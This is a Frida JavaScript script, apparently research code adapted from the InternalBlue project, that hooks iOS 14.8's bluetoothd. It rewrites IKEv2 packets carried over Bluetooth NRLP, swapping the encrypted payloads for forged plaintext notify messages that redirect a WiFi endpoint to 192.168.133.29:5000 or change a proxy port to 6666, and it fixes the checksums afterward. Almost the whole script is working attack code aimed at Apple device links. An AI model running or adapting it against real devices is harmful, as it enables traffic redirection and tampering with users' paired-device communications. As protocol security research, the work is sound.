// Adapted from https://github.com/seemoo-lab/internalblue/blob/master/examples/keychange/ios_keychange.js
// offsets for other iOS versions to be found there
console.log("loaded")
var base = Module.getBaseAddress('bluetoothd')

var OI_HCIIfc_DataReceived = base.add(0xed9f8)  // iOS 14.8, iPhone 8
var OI_HciIfc_CopyPayload = base.add(0xe3764)  // iOS 14.8, iPhone 8
var HCIIfc_src_ptr = base.add(0x688518)  // iOS 14.8, iPhone 8

const glitchOutgoing = true
const glitchIncoming = false
const glitchOnce = true

// WiFi Address replacement
const port = [0x13, 0x88] // port 5000
const ip = [192, 168, 133, 29]
const wifiPayload = [
  // LDM notify (type 0xc60e)
  0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0xc6, 0x0e,
  // LinkDirectorMessage version 2, length 9
  0x02, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00,
  // LDM identifier
  0x00, 0x0f, 0xe3, 0xae, 0x0c, 0xa3, 0xf8, 0x32, 
  // Wifi IPv4 update TLV
  0x03, 0x00, 0x06, port[0], port[1], ip[0], ip[1], ip[2], ip[3]
]

// SHOES proxy port replacement
const shoesPayload = [
    0x2b, 0x00, 0x00, 0x1a, 0x00, 0x00, 0xc6, 0x0d, // notify payload type 0xc60d (ProxyNotify)
    0xfd, 0x74, 0x65, 0x72, 0x6d, 0x6e, 0x00, 0x00, 0x00, 0x0d, 0x6a, 0x14, 0x68, 0x57, 0xbc, 0x23, // tunnel IPv6 address (unchanged)
    0x1a, 0x0a // port 6666
]

const payload = shoesPayload

// next payload none, length to be set dynamically
const filler = [0x00, 0x00, 0x00, 0x00]
var acl = 0
var glitched = false

// outgoing packets
Interceptor.attach(OI_HciIfc_CopyPayload, {
  onEnter: function(args) { acl = this.context.x0 },
  onLeave: function(args) {
    const h4t = HCIIfc_src_ptr.add(0x10).readU8()
    const len = HCIIfc_src_ptr.add(0x1c).readU16()

    // look for type 4 NRLP packets
    if(h4t == 2 && len > 15 && glitchOutgoing) {
      const nrlp = acl.add(6)
      const type = nrlp.readU8() // NRLP type
      // single-payload type-4 NRLP packet
      if(type==4) {
        glitchNRLP(nrlp, true)
      }
    }
  }
})

// incoming packets
Interceptor.attach(OI_HCIIfc_DataReceived, {
  onEnter: function(args) {
    const h4t = parseInt(this.context.x0)
    const acl = this.context.x1
    const len = parseInt(this.context.x2)

    // look for type 4 NRLP packets
    if(h4t == 2 && len > 15 && glitchIncoming) {
      const nrlp = acl.add(10)
      const type = nrlp.readU8() // (suspected) NRLP type
           
      // single-payload type-4 NRLP packet
      if(type == 4)
        glitchNRLP(nrlp, false)
    }
  }
})

function glitchNRLP(nrlp, isOutgoing) {
  const lng = (nrlp.add(1).readU8()<<8) + nrlp.add(2).readU8()

  if(glitchOnce && glitched)
    return

  // long enough?
  if(lng >= 28+payload.length) {
    const ike = nrlp.add(3)
    const flags = ike.add(16)

    // glitch INFORMATIONAL packets, avoiding weird out-of-sequence LDM packets
    if(flags.add(2).readU8() != 0x25 || lng == 0x58 || lng == 0x60)
      return

    const direction = isOutgoing ? "outgoing" : "incoming"
    console.log(`Glitching ${direction} IKEv2:`)
    const preglitch = readHex(nrlp, lng + 5)
    console.log(`orig.: ${preglitch}`)

    // overwrite flags
    flags.writeU8(0x29) // next payload: notify
    if(isOutgoing)
      flags.add(3).writeU8(0x00) // not a response

    // replace ENC&AUTH IKE payload our plaintext notify
    const ikePayload = ike.add(28)
    ikePayload.writeByteArray(payload)
    
    // add filler payload if we have space
    const fillerLen = lng - payload.length - 28
    if(fillerLen>=4) {
      ikePayload.writeU8(0x2b) // next payload: vendor id
      ikePayload.add(payload.length).writeByteArray(filler)
      ikePayload.add(payload.length + 2).writeU8(fillerLen >> 8)
      ikePayload.add(payload.length + 3).writeU8(fillerLen & 0xff)
    }
    else
      ikePayload.writeU8(0x00) // no next payload
  
    // recalculate checksum
    const cs = recalcChecksum(nrlp, lng+3)
    nrlp.add(3+lng).writeByteArray([cs >> 8, cs & 0xff])
    
    const data = readHex(nrlp, lng + 5)
    console.log(`gltch: ${data}`)
    glitched = true
  }
}

function recalcChecksum(nrlpStart, payloadLength) {
  const uneven = (payloadLength % 2) != 0
  let sum = 0
  for(var i = 0; i < Math.ceil(payloadLength/2); i++) {
    const a = nrlpStart.add(i*2).readU8()
    let b = nrlpStart.add(i*2 + 1).readU8()
    if(uneven && (i+1)*2 > payloadLength)
      b = 0
    sum += (a << 8) + b
  }
  let checksum = sum & 0xffff
  const carry = (sum & 0xffff0000) >> 16
  return (checksum + carry) ^ 0xffff
}

function readHex(pointer, length) {
  let res = ""
  for(var i = 0; i < length; i++) {
    const hexByte = pointer.add(i).readU8().toString(16)
    res += (hexByte.length == 1 ? "0" + hexByte : hexByte)
  }
  return res
}